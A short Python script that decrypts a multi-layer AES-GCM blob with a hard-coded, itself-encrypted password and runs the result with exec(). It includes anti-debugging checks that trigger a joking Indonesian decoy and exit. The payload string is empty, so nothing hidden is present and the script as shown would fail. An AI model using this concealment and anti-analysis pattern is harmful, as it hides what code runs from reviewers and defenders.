#!/usr/bin/env python3
import os,sys,base64,zlib
from Crypto.Protocol.KDF import scrypt
from Crypto.Cipher import AES
def decrypt_script_with_layers(enc_script,password):
 raw=base64.b64decode(enc_script)
 layers=raw[0]
 data=raw[1:]
 for i in range(layers):
  salt=data[:32]
  nonce=data[32:44]
  tag=data[44:60]
  ct=data[60:]
  key=scrypt(password,salt,key_len=32,N=131072,r=8,p=2)
  cipher=AES.new(key,AES.MODE_GCM,nonce=nonce)
  data=cipher.decrypt_and_verify(ct,tag)
 return zlib.decompress(data).decode()
def add_extra_encryption(enc_script,password):
 raw=base64.b64decode(enc_script)
 current_layers=raw[0]
 data=raw[1:]
 salt=os.urandom(32)
 key=scrypt(password,salt,key_len=32,N=131072,r=8,p=2)
 nonce=os.urandom(12)
 cipher=AES.new(key,AES.MODE_GCM,nonce=nonce)
 ct,tag=cipher.encrypt_and_digest(data)
 new_data=salt+nonce+tag+ct
 new_layers=current_layers+1
 header=new_layers.to_bytes(1,byteorder='big')
 new_blob=header+new_data
 return base64.b64encode(new_blob).decode()
def check_for_trap():
 return sys.gettrace() is not None or os.getenv("TRAP_MODE")=="1" or os.getenv("PYTHONDEBUG")=="1" or os.getenv("HACKER_MODE")=="1"
def trigger_decoy():
 print("Waduh, kamu kena jebakan decoy! Gak ada apa-apa di sini, bro!")
 try:
  with open("decoy_payload.txt","w") as f:
   f.write("Decoy data: jangan main-main!")
 except Exception:
  pass
 sys.exit(1)
def get_decryption_password():
 if check_for_trap():
  trigger_decoy()
 return get_decryption_password_actual()
def get_decryption_password_actual():
 enc_pwd_blob="e2YQhbw7L1vwIkLVgBApBUg7Q2Tw8uEQ/sQQHc73a/omtj0BFMcr3p+v/UhznbHwMZZOhifUidHw2TEYeGL3tH10HV/B5XBzO6DkPgz2deu9Zsgo2qNWZz6CsB18L37H/lDqkx2Wt3X96Xfy2gpwjK0qKVttginqwIY="
 magic_key=b"gen_z_magic_key_for_decrypt_32b!"
 raw=base64.b64decode(enc_pwd_blob)
 salt=raw[:16]
 nonce=raw[16:28]
 tag=raw[28:44]
 ct=raw[44:]
 return AES.new(scrypt(magic_key,salt,key_len=32,N=131072,r=8,p=2),AES.MODE_GCM,nonce=nonce).decrypt_and_verify(ct,tag).decode()
if __name__=="__main__":
 password=get_decryption_password()
 if check_for_trap():
  trigger_decoy()
 decrypted_code=decrypt_script_with_layers("",password)
 exec(decrypted_code)
